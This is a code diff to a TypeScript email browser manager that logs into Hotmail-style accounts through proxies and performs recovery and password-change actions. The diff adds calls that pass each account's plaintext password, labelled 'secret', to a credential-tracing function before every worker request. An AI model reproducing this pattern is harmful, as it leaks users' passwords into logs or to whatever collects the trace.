@@ -9,6 +9,7 @@ import type {
 } from '../../shared/hotmail'
 import { setBrowserLaunchAwareTimeout } from '../browser/browserLaunchBroker'
 import { startEmailProxyAuthBridge, type EmailProxyAuthBridge } from './emailProxyAuthBridge'
+import { buildEmailLoginPayload, traceEmailCredential } from './emailCredentialBinding'
 import { shouldKeepEmailBrowserWorker } from './emailBrowserLifecycle'
 import { ensureEmailProfileDirectory, inspectEmailProfile } from './emailProfileResolver'
 import {
@@ -95,14 +96,6 @@ function proxyPayload(proxy: EmailProxyCandidate | null) {
   } : {}
 }
 
-function loginPayload(account: AccountRecord) {
-  return {
-    ...(account.email?.trim() ? { loginEmail: account.email.trim() } : {}),
-    ...(account.emailPassword ? { loginPassword: account.emailPassword } : {}),
-    ...(account.backupEmail?.trim() ? { backupEmail: account.backupEmail.trim() } : {})
-  }
-}
-
 function workerErrorResponse(kind: PendingKind, command: Record<string, unknown>, message: string): WorkerResponse {
   const accountId = Number(command.accountId)
   if (kind === 'open-result') {
@@ -165,11 +158,18 @@ export class EmailBrowserManager {
     }
 
     const effectiveProxy = await this.prepareProxy(entry, proxy)
+    traceEmailCredential('manager-before-send', {
+      accountId: account.id,
+      uid: account.uid,
+      email: account.email,
+      secret: account.emailPassword,
+      profileDirectory: entry.profileDirectory
+    })
     const response = await this.send(entry, 'open-result', {
       type: 'open-mail',
       accountId: account.id,
       profileDirectory: entry.profileDirectory,
-      ...loginPayload(account),
+      ...buildEmailLoginPayload(account),
       ...(browserExecutable.trim() ? { executablePath: browserExecutable.trim() } : {}),
       ...proxyPayload(effectiveProxy)
     }) as WorkerOpenResult
@@ -220,13 +220,20 @@ export class EmailBrowserManager {
 
     const resumeAfterAuth = shouldResumeEmailActionAfterAuth(entry.authResumeKind, 'recovery-result', confirmCompleted)
     const effectiveProxy = await this.prepareProxy(entry, proxy)
+    traceEmailCredential('manager-before-send', {
+      accountId: account.id,
+      uid: account.uid,
+      email: account.email,
+      secret: account.emailPassword,
+      profileDirectory: entry.profileDirectory
+    })
     const response = await this.send(entry, 'recovery-result', {
       type: 'recovery-action',
       accountId: account.id,
       profileDirectory: entry.profileDirectory,
       operation,
       confirmCompleted: resumeAfterAuth ? false : confirmCompleted,
-      ...loginPayload(account),
+      ...buildEmailLoginPayload(account),
       ...(browserExecutable.trim() ? { executablePath: browserExecutable.trim() } : {}),
       ...proxyPayload(effectiveProxy)
     }) as WorkerRecoveryResult
@@ -277,12 +284,19 @@ export class EmailBrowserManager {
 
     const resumeAfterAuth = shouldResumeEmailActionAfterAuth(entry.authResumeKind, 'password-result', confirmCompleted)
     const effectiveProxy = await this.prepareProxy(entry, proxy)
+    traceEmailCredential('manager-before-send', {
+      accountId: account.id,
+      uid: account.uid,
+      email: account.email,
+      secret: account.emailPassword,
+      profileDirectory: entry.profileDirectory
+    })
     const response = await this.send(entry, 'password-result', {
       type: 'password-action',
       accountId: account.id,
       profileDirectory: entry.profileDirectory,
       confirmCompleted: resumeAfterAuth ? false : confirmCompleted,
-      ...loginPayload(account),
+      ...buildEmailLoginPayload(account),
       ...(account.emailPassword ? { currentPassword: account.emailPassword } : {}),
       newPassword,
       ...(browserExecutable.trim() ? { executablePath: browserExecutable.trim() } : {}),
